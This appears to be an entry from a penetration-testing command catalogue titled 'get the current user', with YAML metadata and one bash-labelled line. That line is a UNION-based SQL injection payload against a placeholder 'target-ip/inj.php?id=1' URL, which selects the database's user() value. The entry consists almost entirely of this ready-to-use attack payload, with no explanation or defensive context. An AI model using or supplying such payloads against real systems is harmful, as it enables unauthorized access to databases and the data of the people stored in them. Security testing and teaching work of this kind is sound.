---
id: cf574c20-09eb-4927-a7b8-18c9af262795
name: get the current user
type: command
executor: bash
data: 'http://target-ip/inj.php?id=1 union all select 1,2,3,user(),5

  '
output: null
created_at: '2020-07-14T18:14:46.798904+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# get the current user

```bash
http://target-ip/inj.php?id=1 union all select 1,2,3,user(),5

```
